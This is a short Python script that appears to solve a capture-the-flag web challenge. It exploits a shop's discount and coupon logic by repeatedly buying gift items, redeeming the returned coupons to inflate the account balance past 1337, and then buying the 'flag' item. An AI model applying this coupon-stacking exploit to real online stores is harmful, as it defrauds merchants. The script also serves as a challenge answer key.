import requests
import re

url = "http://14.225.211.39:34126/"

session = requests.session()
session_get = session.get(url)

def apply_discount(session):
    discount = session.post(url + "/cart", data={"discount_code": "THANKYOU"})

def add_item(session, item_id):
    session.post(url + f"/add_to_cart/{item_id}")

def add_multiple_items(session, item_ids):
    for item_id in item_ids:
        add_item(session, item_id)
        print(f"[-] Item {item_id} added to cart.")

def pay_and_get_discount_code(session):
    check_out = session.get(url + "/checkout?")
    message = check_out.text
    coupons = message.split(": ")[1].split(", ")
    print(f"[*] Received {len(coupons)} coupons.")

    return coupons

def redeem_coupon(session, coupon):
    redeem = session.post(url + "/submit_coupon", data={"coupon": coupon})
    print(redeem.text)

def get_balance(session):
    final_cart = session.get(url + "/cart").text
    user_balance = int(re.search(r'<p>User\'s Balance: \$([\d,]+)</p>', final_cart).group(1)) if re.search(
        r'<p>User\'s Balance: (\$[\d,]+)</p>', final_cart) else 0
    print(f"[*] Now, you're having: {user_balance}")
    return user_balance

def buy_flag(session):
    while get_balance(session) < 1337:
        apply_discount(session)
        add_multiple_items(session, ["gift"] * 10)
        coupons = pay_and_get_discount_code(session)
        for coupon in coupons:
            redeem_coupon(session, coupon)
        print()

    print(f'Current balance: {get_balance(session)}')
    print("[-] Buying flag...")

    apply_discount(session)
    add_item(session, "flag")

    print("[-] Checking out for flag...")
    check_out = session.get(url + "/checkout?")
    flag_mess = check_out.text

    print(flag_mess)

buy_flag(session)